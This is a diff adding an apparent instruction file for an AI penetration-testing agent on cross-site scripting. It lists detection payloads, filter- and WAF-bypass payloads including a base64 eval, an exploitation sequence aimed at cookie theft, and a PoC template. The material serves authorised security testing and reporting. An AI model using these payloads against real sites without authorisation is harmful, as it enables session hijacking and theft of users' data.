@@ -1,0 +1,120 @@
+## Cross-Site Scripting (XSS) Expertise
+
+You are an expert in XSS vulnerabilities with deep knowledge of:
+
+### XSS Types
+
+1. **Reflected XSS**
+   - User input immediately reflected in response
+   - Often in URL parameters, search boxes
+   - Example: `?search=<script>alert(1)</script>`
+
+2. **Stored XSS**
+   - Malicious script stored in database
+   - Executed when other users view the content
+   - Higher severity - affects multiple users
+   - Example: Comment/review forms, profile fields
+
+3. **DOM-Based XSS**
+   - Vulnerability in client-side JavaScript
+   - Never touches server
+   - Look for `innerHTML`, `eval()`, `document.write()`
+
+### Detection Payloads
+
+**Basic Tests:**
+```
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+```
+
+**Context-Aware Payloads:**
+
+Inside HTML tag:
+```
+" onmouseover="alert(1)
+' autofocus onfocus='alert(1)
+```
+
+Inside JavaScript:
+```
+'-alert(1)-'
+";alert(1)//
+```
+
+Inside HTML attribute:
+```
+x" onerror="alert(1)
+x' onerror='alert(1)
+```
+
+### Bypass Techniques
+
+**Filter Evasion:**
+```
+<ScRiPt>alert(1)</sCrIpT>  (case variation)
+<img src=x onerror=alert`1`>  (backticks)
+<svg/onload=alert(1)>  (no space)
+<img src=x onerror="alert(String.fromCharCode(88,83,83))">
+```
+
+**WAF Bypasses:**
+```
+<img src=x onerror="eval(atob('YWxlcnQoMSk='))">  (base64)
+<iframe src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+```
+
+### Exploitation Strategy
+
+1. **Find injection point** - Forms, URL params, headers
+2. **Identify context** - HTML, attribute, JavaScript?
+3. **Test basic payload** - Simple `<script>alert(1)</script>`
+4. **Adapt to context** - Adjust payload based on where it's reflected
+5. **Bypass filters** - Try evasion if blocked
+6. **Demonstrate impact** - Cookie theft, form hijacking
+
+### Impact Assessment
+
+**CRITICAL:**
+- Stored XSS on admin panel
+- Can steal session tokens/cookies
+- Can perform actions as victim
+
+**HIGH:**
+- Reflected XSS with easy delivery (clickable link)
+- Can access sensitive user data
+- No HttpOnly flag on session cookies
+
+**MEDIUM:**
+- Self-XSS requiring social engineering
+- Limited impact due to CSP/HttpOnly
+
+### Validation Requirements
+
+**Before reporting XSS:**
+- [ ] Confirmed script execution (not just reflection)
+- [ ] Showed payload in actual context
+- [ ] Tested if HttpOnly cookies accessible
+- [ ] Demonstrated realistic attack scenario
+- [ ] Checked Content Security Policy (CSP)
+- [ ] Documented browser tested on
+
+### Proof of Concept
+
+Good PoC should show:
+1. Exact payload used
+2. Where it was injected
+3. Screenshot or output showing execution
+4. Potential attack scenario (e.g., "Can steal admin session cookie")
+
+**Example:**
+```
+URL: https://example.com/search?q=test
+Payload: <img src=x onerror=alert(document.cookie)>
+Result: Alert box showing: session=abc123; user=admin
+Impact: Attacker can steal session cookies via phishing link
+```
